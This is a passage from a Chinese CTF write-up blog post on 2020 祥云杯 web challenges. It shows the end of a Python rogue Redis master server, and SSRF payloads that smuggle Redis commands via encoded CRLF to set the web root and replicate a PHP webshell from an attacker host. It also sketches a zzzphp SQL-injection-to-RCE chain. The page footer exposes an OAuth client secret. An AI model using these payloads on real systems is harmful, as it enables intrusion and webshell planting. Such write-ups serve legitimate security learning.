class="keyword">break</span></span><br><span class="line">        self.finish()</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">finish</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.request.close()</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RoguoServer</span><span class="params">(socketserver.TCPServer)</span>:</span></span><br><span class="line">    allow_reuse_address = <span class="literal">True</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, server_address, payload)</span>:</span></span><br><span class="line">        super(RoguoServer, self).__init__(server_address, RoguoHandler, <span class="literal">True</span>)</span><br><span class="line">        self.payload = payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"a.php"</span>, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    server = RoguoServer((<span class="string">'0.0.0.0'</span>, <span class="number">6680</span>), f.read())</span><br><span class="line">    server.handle_request()</span><br></pre></td></tr></table></figure>
+
+<p>设置/var/www/html目录</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url&#x3D;http:&#x2F;&#x2F;root:root@127.0.0.1:5000@baidu.com&#x2F;?url&#x3D;http:&#x2F;&#x2F;127.0.0.1:6379?%250D%250Aauth%2520123456%250d%250aconfig%2520set%2520dir%2520%252fvar%252fwww%252fhtml%250d%250a1</span><br></pre></td></tr></table></figure>
+
+<p>主从复制🐎</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url&#x3D;http:&#x2F;&#x2F;root:root@127.0.0.1:5000@baidu.com&#x2F;?url&#x3D;http:&#x2F;&#x2F;127.0.0.1:6379?%250D%250Aauth%2520123456%250d%250aconfig%2520set%2520dbfilename%2520a.php%250d%250aslaveof%2520ip%25206680%250d%250aquit%250a1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/11/23/2020%E7%A5%A5%E4%BA%91%E6%9D%AFWeb%E9%A2%98%E7%9B%AEwriteup/image-20201123233920735.png" alt="image-20201123233920735"></p>
+<h1 id="0x05-easyzzzz"><a href="#0x05-easyzzzz" class="headerlink" title="0x05 easyzzzz"></a>0x05 easyzzzz</h1><p>访问<code>/更新日志.txt</code>,可以知道是1.8.0版本，用<a href="https://github.com/h4ckdepy/zzzphp/issues/1" target="_blank" rel="noopener">这个</a>可以注出密码，md5解密后登后台，后台有一个经典的修改模板导致的rce，</p>
+<p><img src="/2020/11/23/2020%E7%A5%A5%E4%BA%91%E6%9D%AFWeb%E9%A2%98%E7%9B%AEwriteup/image-20201124211517841.png" alt="image-20201124211517841">)直接用<a href="https://mount4in.github.io/2020/08/21/2020ciscn-web%E9%A2%98%E7%9B%AEwriteup/">国赛</a>的一道题的payload</p>
+<p><img src="/2020/11/23/2020%E7%A5%A5%E4%BA%91%E6%9D%AFWeb%E9%A2%98%E7%9B%AEwriteup/image-20201124211628600.png" alt="image-20201124211628600"></p>
+<h1 id="0x06-easygogogo"><a href="#0x06-easygogogo" class="headerlink" title="0x06 easygogogo"></a>0x06 easygogogo</h1>
+      
+    </div>
+  </div>
+  <!-- 要添加的内容 -->
+  
+    <div>
+        <ul class="post-copyright">
+          <li class="post-copyright-author">
+          <strong>作者:  </strong>Mount4in</a>
+          </li>
+          <li class="post-copyright-link">
+          <strong>文章链接:  </strong>
+          <a href="/2020/11/23/2020祥云杯Web题目writeup/" target="_blank" title="2020祥云杯Web题目writeup">http://mount4in.github.io/2020/11/23/2020祥云杯Web题目writeup/</a>
+          </li>
+          <li class="post-copyright-license">
+            <strong>版权声明:   </strong>
+            本网站所有文章除特别声明外,均采用 <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">CC BY-NC-ND 4.0</a>
+            许可协议。转载请注明出处!
+          </li>
+        </ul>
+      <div>
+
+  
+  <!---->
+    <footer class="article-footer">
+      <a data-url="http://mount4in.github.io/2020/11/23/2020%E7%A5%A5%E4%BA%91%E6%9D%AFWeb%E9%A2%98%E7%9B%AEwriteup/" data-id="clg20p5uo001e14uv9hphau2y"
+         class="article-share-link">Share</a>
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/writeup/" rel="tag">writeup</a></li></ul>
+
+    </footer>
+
+
+
+  
+    
+  <nav class="article-nav">
+    
+      <a href="/2020/12/04/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E2%80%94%E2%80%94CVE-2015-4852/" class="article-nav-link">
+        <strong class="article-nav-caption">Newer</strong>
+        <div class="article-nav-title">
+          
+            weblogic漏洞分析——CVE-2015-4852
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2020/11/20/2020KCTF%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/" class="article-nav-link">
+        <strong class="article-nav-caption">Older</strong>
+        <div class="article-nav-title">2020KCTF部分题目复现</div>
+      </a>
+    
+  </nav>
+
+
+  
+
+
+  
+    
+  <div class="gitalk" id="gitalk-container"></div>
+  
+<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+
+  
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+  
+<script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.min.js"></script>
+
+  <script type="text/javascript">
+    var gitalk = new Gitalk({
+      clientID: 'b7d32ae2538e1a71f462',
+      clientSecret: 'da0452b610458a4ccbc38598fb0d02f0eb9e653d',
+      repo: 'gitalk',
+      owner: 'Mount4in',
+      admin: ['Mount4in'],
+      // id: location.pathname,      // Ensure uniqueness and length less than 50
+      id: md5(location.pathname),
+      distractionFreeMode: false,  // Facebook-like distraction free mode
+      pagerDirection: 'last'
+    })
+
+  gitalk.render('gitalk-container')
+  </script>
+
+  
+
+</article>
+
+
+
+</section>
+  <footer class="footer">
+  <div class="outer">
+    <div class="float-right">
+      <ul class="list-inline">
+  
+    <li><i class="fe fe-smile-alt"></i> <span id="busuanzi_value_site_uv"></span></li>
+  
+    <li><i class="fe fe-bookmark"></i> <span id="busuanzi_value_page_pv"></span></li>
+  
+</ul>
+    </div>
+    <ul class="list-inline">
+      <li>&copy; 2023 Mount4in</li>
+      <li>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></li>
+      <li>Theme  <a href="https://github.com/zhwangart/hexo-theme-ocean" target="_blank" rel="noopener">Ocean</a></li>
+    </ul>
+  </div>
+</footer>
+
+</main>
+<aside class="sidebar">
+  <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+    <div class="logo">
+      <a href="/"><img src="/images/hexo.svg" alt="Mount4in"></a>
+    </div>
+  
+  <ul class="nav nav-main">
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/">Home</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/archives">Archives</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/about">About</a>
+      </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link nav-item-search" title="Search">
+        <i class="fe fe-search"></i>
+        Search
+      </a>
+    </li>
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      <div class="totop" id="totop">
+  <i class="fe fe-rocket"></i>
+</div>
+    </li>
+    <li class="nav-item">
+      
+        <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+          <i class="fe fe-feed"></i>
+        </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+</aside>
+
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+  
+<script src="/js/tocbot.min.js"></script>
+
+  <script>
+    // Tocbot_v4.7.0  http://tscanlin.github.io/tocbot/
+    tocbot.init({
+      tocSelector: '.tocbot',
+      contentSelector: '.article-entry',
+      headingSelector: 'h1, h2, h3, h4, h5, h6',
+      hasInnerContainers: true,
+      scrollSmooth: true,
+      positionFixedSelector: '.tocbot',
+      positionFixedClass: 'is-position-fixed',
+      fixedSidebarOffset: 'auto',
+    });
+  </script>
+
+
+
+<script src="/js/ocean.js"></script>
+
+
+</body>
+</html>
